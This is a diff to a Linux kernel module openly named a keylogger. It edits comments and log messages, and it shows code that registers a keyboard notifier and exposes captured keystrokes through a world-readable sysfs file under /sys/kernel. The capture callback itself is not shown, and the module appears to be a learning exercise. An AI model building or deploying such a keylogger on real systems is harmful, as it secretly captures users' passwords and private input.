@@ -28,7 +28,9 @@ static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,cha
 static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain
 
 
-/*like read function return length of buffer. */
+/*Just as read function.
+ To access the sysfs attributes
+ */
 static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf)
 {
 	
@@ -87,7 +89,7 @@ static struct notifier_block nb = {
 
 
 
-/*initialize the struct kobject_attribute (By value)*/
+/*initialize the struct kobject_attribute (By value).*/
 static struct kobj_attribute keyLog_attr = {
 	.attr = {.name = "keyLog" ,
 			 .mode = 0644,
@@ -125,7 +127,7 @@ int err;
 /*create a struct kobject dynamically
  * increments refcount and register it eith sysfs
  * name of this kobjeck : "key_logger" , parent of this kobject : kernel_kobject
- * This kobkect will be in : /sys/kernel
+ * This kobject will be in : /sys/kernel
  * MUST --> when we will finish withe this structure we need to call kobject_put()*/
 keyLog_obj = kobject_create_and_add("key_logger", kernel_kobj);
 
@@ -140,15 +142,18 @@ if (!keyLog_obj)
  * sysfs_creare_group --> kobject : keyLog_obj , struct attribute_group : attr_group */	
 err = sysfs_create_group(keyLog_obj, &attr_group);
 
+printk(KERN_INFO "keylog_init() : key_Logger Created successfully");
 /*Returns 0 on success*/
 if (err)
 	kobject_put(keyLog_obj);//decrement refcount for kobject. when refcount == 0 -> call Kobject_cleanup() through kobject_release()
 							//call kobject_put and the structure will be dynamically freed when it is no longer being used.
 						
-printk(KERN_INFO "keylog_init() : key_Logger Created successfully");
+
 
 /***********************************/								
 register_keyboard_notifier(&nb);
+
+printk(KERN_NOTICE "notifier block register to notification chains of keyboard\n");
 
 
 /*memset(...)-->used to fill a block of memory with a particular value. initialize the keys_buffer
@@ -168,7 +173,7 @@ return 0;
 {
 	kobject_put(keyLog_obj);
 	unregister_keyboard_notifier(&nb);
-	printk(KERN_NOTICE "Keylogger unregister\n");
+	printk(KERN_NOTICE "notifier block unregister from notification chains  of keyboard\n");
 	printk(KERN_NOTICE "Keylogger module unloaded\n");
 	
 }
